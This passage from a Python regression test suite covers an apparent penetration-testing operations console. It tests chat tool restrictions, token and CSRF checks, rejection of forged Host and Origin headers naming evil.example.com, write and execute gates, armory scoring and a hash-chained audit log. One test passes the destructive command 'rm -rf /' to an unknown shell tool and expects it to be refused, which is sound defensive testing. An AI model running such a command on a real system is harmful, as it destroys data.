                raise AssertionError("未确认的 intent 不应允许认领")
            except urllib.error.HTTPError as exc:
                assert exc.code == 400

            api(f"/api/confirm/{iid}", {})
            api(f"/api/ops/claim/{iid}", {"worker": "web"})
            done = api(f"/api/ops/done/{iid}", {
                "description": "首页 200", "kind": "vuln", "data": {"cve": "CVE-X"},
            })
            did = done["fact"]["id"]
            assert did != fid, done
            assert done["intent"]["status"] == "done"

            found = api("/api/search?q=10.1.2.3")
            assert any(f["id"] == fid for f in found["facts"]), found

            on_disk = read_json(work / ".sapper" / "facts" / f"{did}.json")
            assert on_disk["data"]["cve"] == "CVE-X"
        finally:
            proc.terminate()
            proc.wait(timeout=10)
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# chat (conversational operator)
# --------------------------------------------------------------------------- #
@case("chat: 工具层只做受控动作，未知工具报错")
def chat_tools():
    sys.path.insert(0, str(ROOT / "lib"))
    import chat as chatmod

    calls = []

    class Ops:
        store = None

        def fact(self, body):
            calls.append(("fact", body.get("kind")))
            return {"id": "f009", "kind": body.get("kind")}

        def intent(self, body):
            calls.append(("intent", body.get("title")))
            return {"id": "i009", "title": body.get("title")}

        def done(self, iid, body):
            calls.append(("done", iid))
            return {"fact": {"id": "f010"}, "intent": {"id": iid}}

        def search(self, q):
            return {"q": q, "facts": [], "intents": [], "assets": [], "traffic": []}

    work = Path(tempfile.mkdtemp(prefix="sapper-chat-"))
    try:
        session = chatmod.ChatSession(work, Ops())
        assert session._tool("create_fact", {"description": "x", "kind": "host"})["id"] == "f009"
        assert session._tool("create_intent", {"from": ["f009"], "description": "y"})["id"] == "i009"
        assert session._tool("complete_intent", {"id": "i009", "description": "z"})["fact"] == "f010"
        assert [a["tool"] for a in session.actions] == [
            "create_fact", "create_intent", "complete_intent"], session.actions
        assert calls == [("fact", "host"), ("intent", None), ("done", "i009")], calls

        try:
            session._tool("shell", {"cmd": "rm -rf /"})
            raise AssertionError("未知工具必须报错")
        except chatmod.ChatError:
            pass

        # view() must hide tool_result payloads and keep text/tool chips
        session.messages = [
            {"role": "user", "content": "hi"},
            {"role": "assistant", "content": [
                {"type": "text", "text": "看一下"},
                {"type": "tool_use", "id": "t1", "name": "search_facts", "input": {"q": "x"}},
            ]},
            {"role": "user", "content": [
                {"type": "tool_result", "tool_use_id": "t1", "content": "{}"},
            ]},
            {"role": "assistant", "content": [{"type": "text", "text": "结论"}]},
        ]
        view = session.view()
        roles = [v["role"] for v in view]
        assert roles == ["user", "assistant", "tool", "assistant"], roles
        assert view[2]["text"] == "search_facts"
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
# serve (read-only by default)
# --------------------------------------------------------------------------- #
TOKEN = os.environ.setdefault("SAPPER_CONSOLE_TOKEN", "regress-token-please-change")
AUTH = {"Authorization": f"Bearer {TOKEN}"}


def http_call(port: int, method: str, path: str, body: dict | None = None,
              headers: dict | None = None):
    """Minimal HTTP client: full control over Host/Origin/Sec-Fetch-Site."""
    import http.client
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    hdrs = dict(headers or {})
    payload = None
    if body is not None:
        payload = json.dumps(body).encode()
        hdrs.setdefault("Content-Type", "application/json")
        hdrs.setdefault("X-Sapper-Request", "1")
    try:
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


def wait_ready(port: int, headers: dict, path: str = "/api/health") -> None:
    import time
    deadline = time.time() + 20
    while time.time() < deadline:
        try:
            code, _ = http_call(port, "GET", path, headers=headers)
            if code == 200:
                return
        except OSError:
            pass
        time.sleep(0.3)
    raise AssertionError("服务未能在 20s 内就绪")


@case("serve: 认证/CSRF/Host 校验/只读拒绝写")
def serve_readonly():
    import socket

    work = fresh()
    try:
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]

        proc = subprocess.Popen(
            [sys.executable, str(ENTRY), "serve", "--port", str(port), "--rebuild"],
            cwd=str(work), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            wait_ready(port, AUTH)

            # 1) 无令牌：一律 401（HTML 请求给可读提示页）
            code, _ = http_call(port, "GET", "/api/health")
            assert code == 401, code
            code, body = http_call(port, "GET", "/")
            assert code == 401 and b"TOKEN" in body, (code, body[:80])

            # 2) 有令牌：读接口正常，能力位如实上报
            code, body = http_call(port, "GET", "/api/health", headers=AUTH)
            assert code == 200, code
            health = json.loads(body)
            assert health["write"] is False and health["exec"] is False, health

            # 3) Host 不在白名单 -> 421（DNS rebinding）
            code, _ = http_call(port, "GET", "/api/health",
                                headers={**AUTH, "Host": f"evil.example.com:{port}"})
            assert code == 421, code

            # 4) 跨站请求 -> 403
            code, _ = http_call(port, "GET", "/api/health",
                                headers={**AUTH, "Sec-Fetch-Site": "cross-site"})
            assert code == 403, code
            code, _ = http_call(port, "POST", "/api/chat", {"message": "x"},
                                headers={**AUTH, "Origin": "http://evil.example.com"})
            assert code == 403, code

            # 5) 静态资源需要认证
            for route in ("/js/main.js", "/css/app.css", "/js/graph.js", "/vendor/d3.min.js"):
                code, body = http_call(port, "GET", route, headers=AUTH)
                assert code == 200 and len(body) > 100, (route, code)

            # 6) 只读模式下写接口一律 403
            for path, body in (("/api/ops/fact", {"description": "x"}),
                               ("/api/confirm/i001", {})):
                code, _ = http_call(port, "POST", path, body, headers=AUTH)
                assert code == 403, (path, code)

            # 7) 缺 X-Sapper-Request -> 403（跨站表单不可伪造）
            code, _ = http_call(port, "POST", "/api/ops/fact", {"description": "x"},
                                headers={**AUTH, "X-Sapper-Request": ""})
            assert code == 403, code
        finally:
            proc.terminate()
            proc.wait(timeout=10)
    finally:
        shutil.rmtree(work, ignore_errors=True)


@case("serve: --allow-write 可写，--allow-exec 才是执行开关")
def serve_write_ops():
    import socket

    work = fresh()
    try:
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]

        proc = subprocess.Popen(
            [sys.executable, str(ENTRY), "serve", "--port", str(port),
             "--rebuild", "--allow-write"],
            cwd=str(work), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        try:
            wait_ready(port, AUTH)
            health = json.loads(http_call(port, "GET", "/api/health", headers=AUTH)[1])
            assert health["write"] is True and health["exec"] is False, health

            assert json.loads(http_call(port, "GET", "/api/chat", headers=AUTH)[1])["enabled"] is True

            got = json.loads(http_call(port, "POST", "/api/ops/fact", {
                "title": "web 建的主机", "description": "从 HTTP 接口写入",
                "kind": "host", "data": {"host": "10.1.2.3"},
            }, headers=AUTH)[1])
            fid = got["fact"]["id"]
            assert got["fact"]["creator"] == "web"

            got = json.loads(http_call(port, "POST", "/api/ops/intent", {
                "title": "web 建的意图", "description": "验证写接口",
                "from": [fid], "requires_confirmation": True,
            }, headers=AUTH)[1])
            iid = got["intent"]["id"]

            # 未确认不能认领
            code, _ = http_call(port, "POST", f"/api/ops/claim/{iid}", {"worker": "web"},
                                headers=AUTH)
            assert code == 400, code

            assert http_call(port, "POST", f"/api/confirm/{iid}", {}, headers=AUTH)[0] == 200
            assert http_call(port, "POST", f"/api/ops/claim/{iid}", {"worker": "web"},
                             headers=AUTH)[0] == 200
            done = json.loads(http_call(port, "POST", f"/api/ops/done/{iid}", {
                "description": "首页 200", "kind": "vuln", "data": {"cve": "CVE-X"},
            }, headers=AUTH)[1])
            did = done["fact"]["id"]
            assert did != fid

            found = json.loads(http_call(port, "GET", "/api/search?q=10.1.2.3",
                                         headers=AUTH)[1])
            assert any(f["id"] == fid for f in found["facts"]), found

            on_disk = read_json(work / ".sapper" / "facts" / f"{did}.json")
            assert on_disk["data"]["cve"] == "CVE-X"

            # 空消息被拒绝
            assert http_call(port, "POST", "/api/chat", {"message": "  "}, headers=AUTH)[0] == 400

            # 写会话不能直接执行：没有 --allow-exec 时派发 403
            code, _ = http_call(port, "POST", f"/api/ops/dispatch/{iid}", {}, headers=AUTH)
            assert code == 403, code

            # 武器库：自动 seed、记分、弃用、自动选优、新建
            arm = json.loads(http_call(port, "GET", "/api/armory", headers=AUTH)[1])
            assert len(arm["weapons"]) >= 4, arm
            codes = []
            for _ in range(3):
                r = json.loads(http_call(port, "POST", "/api/ops/armory", {
                    "action": "report", "weapon": "w002", "vid": "v2",
                    "result": "blocked"}, headers=AUTH)[1])
                codes.append(r["confidence"])
            assert codes == sorted(codes, reverse=True) and codes[-1] < codes[0], codes
            assert r["deprecated"] is True, r

            use = json.loads(http_call(port, "POST", "/api/ops/armory", {
                "action": "use", "weapon": "w002"}, headers=AUTH)[1])
            assert use["variant"] != "v2", use
            assert use["command"], use

            added = json.loads(http_call(port, "POST", "/api/ops/armory", {
                "action": "add", "name": "回归武器", "family": "test/regress",
                "variants": [{"vid": "v1", "command": "echo hi"}]}, headers=AUTH)[1])
            assert added["weapon"]["id"].startswith("w"), added

            # 完成意图时记分；无效变体必须在写图前被拒
            iid2 = json.loads(http_call(port, "POST", "/api/ops/intent", {
                "description": "记分用", "from": [fid]}, headers=AUTH)[1])["intent"]["id"]
            scored = json.loads(http_call(port, "POST", f"/api/ops/done/{iid2}", {
                "description": "产出一条", "kind": "note",
                "weapon": "w002", "vid": "v3", "result": "ok"}, headers=AUTH)[1])
            assert scored["weapon"]["confidence"] > 0.5, scored

            iid3 = json.loads(http_call(port, "POST", "/api/ops/intent", {
                "description": "非法变体用", "from": [fid]}, headers=AUTH)[1])["intent"]["id"]
            code, _ = http_call(port, "POST", f"/api/ops/done/{iid3}", {
                "description": "x", "weapon": "w002", "vid": "v99", "result": "ok"},
                headers=AUTH)
            assert code == 400, code
            still = read_json(work / ".sapper" / "intents" / f"{iid3}.json")
            assert still["to"] is None and still["status"] == "open", still

            # 审计日志：每次写操作留痕且带哈希链
            lines = (work / ".sapper" / "audit.jsonl").read_text(encoding="utf-8").splitlines()
            assert len(lines) >= 4, lines
            first, last = json.loads(lines[0]), json.loads(lines[-1])
            assert last["hash"] and first["prev"] == "", (first, last)
            ops_seen = {json.loads(x)["op"] for x in lines}
            assert {"fact.create", "intent.create", "intent.done"} <= ops_seen, ops_seen
        finally:
            proc.terminate()
            proc.wait(timeout=10)
    finally:
        shutil.rmtree(work, ignore_errors=True)


# --------------------------------------------------------------------------- #
SUITES = {
    "surface": [surface_all_commands, sync_all_writes],
    "cli": [cli_setup, cli_lifecycle, cli_reads, cli_rejects_bad_kind],
    "guard": [
        guard_private_no_scope, guard_public_no_scope, guard_out_of_scope,
        guard_force, guard_skip, guard_destructive, guard_exfil_ask,
        guard_subdomain_boundary, guard_no_false_domain, guard_broken_scope,
    ],
    "index": [index_missing_ok, index_corrupt_ok, index_sync],
    "audit": [audit_findings, audit_clean],
    "armory": [armory_basic, armory_scoring, armory_deprecate, armory_use_best,
               armory_done_link, armory_errors],
    "assets": [assets_ingest, assets_cross_task, assets_rebuild],
    "traffic": [traffic_filter, traffic_query, traffic_clear_guard],
    "chat": [chat_tools],
    "serve": [serve_readonly, serve_write_ops],
}


def main() -> int:
    only = sys.argv[1] if len(sys.argv) > 1 else None
    for suite, tests in SUITES.items():
        if only and suite != only:
            continue
        print(f"\n[{suite}]")
        for test in tests:
            test()

    total = len(PASS) + len(FAIL)
    print(f"\n{'='*50}\n{len(PASS)}/{total} 通过")
    if FAIL:
        print("\n失败项:")
        for name, err in FAIL:
            print(f"  - {name}: {err}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
